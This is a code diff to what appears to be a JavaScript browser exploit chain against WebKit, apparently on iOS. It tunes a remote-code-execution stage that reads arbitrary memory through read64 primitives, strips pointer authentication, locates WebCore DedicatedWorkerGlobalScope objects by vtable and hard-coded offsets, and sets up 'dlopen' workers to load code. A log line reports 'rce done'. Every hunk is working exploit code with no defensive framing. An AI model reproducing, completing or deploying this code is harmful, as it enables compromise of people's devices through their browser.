@@ -130,12 +130,13 @@ function orderedBigIntOffsets(preferred, defaults) {
         add(offset);
     return ordered;
 }
-function resolveWorkerGlobalWrapper(read64, worker, log, validateButterfly, preferredScriptOffset, preferredStrongOffset) {
-    const scriptOffsets = orderedBigIntOffsets(preferredScriptOffset, [
+function resolveWorkerGlobalWrapper(read64, worker, log, validateButterfly, preferredScriptOffset, preferredStrongOffset, strictPreferred = false) {
+    const usePreferredOnly = strictPreferred && typeof preferredScriptOffset === 'bigint' && typeof preferredStrongOffset === 'bigint';
+    const scriptOffsets = usePreferredOnly ? [preferredScriptOffset] : orderedBigIntOffsets(preferredScriptOffset, [
         0x158n, 0x150n, 0x148n, 0x140n, 0x160n, 0x138n, 0x168n,
         0x130n, 0x170n, 0x128n, 0x178n, 0x120n, 0x180n, 0x188n
     ]);
-    const strongOffsets = orderedBigIntOffsets(preferredStrongOffset, [
+    const strongOffsets = usePreferredOnly ? [preferredStrongOffset] : orderedBigIntOffsets(preferredStrongOffset, [
         0x18n, 0x20n, 0x28n, 0x30n, 0x10n, 0x38n, 0x40n, 0x48n,
         0x50n, 0x58n, 0x60n, 0x68n, 0x70n, 0x78n, 0x80n
     ]);
@@ -18265,6 +18266,7 @@ const device_chipset = {
           if (!worker)
               throw new TryAgainError(`stage1 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
 
+          p_rce.worker_context = worker;
           resolverCheckpoint(`worker selected=${worker.hex()}`);
           resolverCheckpoint(`reading workerOrWorkletThread at ${(worker + 0x160n).hex()}`);
           const workerOrWorkletThreadRaw = read64(worker + 0x160n);
@@ -18423,8 +18425,11 @@ const device_chipset = {
           p.slide = slide;
           p.worker_script_offset = p_rce.worker_script_offset;
           p.worker_global_scope_wrapper_offset = p_rce.worker_global_scope_wrapper_offset;
+          p.worker_context = p_rce.worker_context;
           if (typeof p.worker_script_offset === 'bigint' && typeof p.worker_global_scope_wrapper_offset === 'bigint')
             print(`worker global offsets cached: script=${offsetHex(p.worker_script_offset)} strong=${offsetHex(p.worker_global_scope_wrapper_offset)}`);
+          if (typeof p.worker_context === 'bigint')
+            print(`worker context cached: ${p.worker_context.hex()}`);
           print("Finished stage2 prims succesfully, rce done");
           self.postMessage({
             type: 'prepare_dlopen_workers'
@@ -18642,6 +18647,10 @@ async function main() {
             const vtable = codePointerNoPac(vtableRaw);
             if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
             workerResolverCheckpoint(`context ${i} worker=${context.hex()} vtable=${vtableRaw.hex()} code=${vtable.hex()}`);
+            if (typeof p.worker_context === 'bigint' && context === p.worker_context) {
+              workerResolverCheckpoint(`context ${i} skipping rce worker`);
+              continue;
+            }
             const workerOrWorkletThreadRaw = p.read64(context + 0x160n);
             const workerOrWorkletThread = stripPointerForRead(workerOrWorkletThreadRaw, "workerOrWorkletThread", workerResolverCheckpoint);
             if (!isLikelyReadablePointer(workerOrWorkletThread)) {
@@ -18662,7 +18671,7 @@ async function main() {
               if (id == 0xfffe000033333333n)
                 return { id, bitmap };
               return null;
-            }, p.worker_script_offset, p.worker_global_scope_wrapper_offset);
+            }, p.worker_script_offset, p.worker_global_scope_wrapper_offset, true);
             if (!workerGlobal) {
               workerResolverCheckpoint(`worker=${context.hex()} global wrapper not resolved`);
               continue;
@@ -18680,6 +18689,10 @@ async function main() {
                 thread: thread,
                 id: id
               };
+            }
+            if (dlopen_workers.length >= 2) {
+              workerResolverCheckpoint("found required dlopen workers");
+              break;
             }
           }
           print(`dlopen workers found: ${dlopen_workers.length}`);
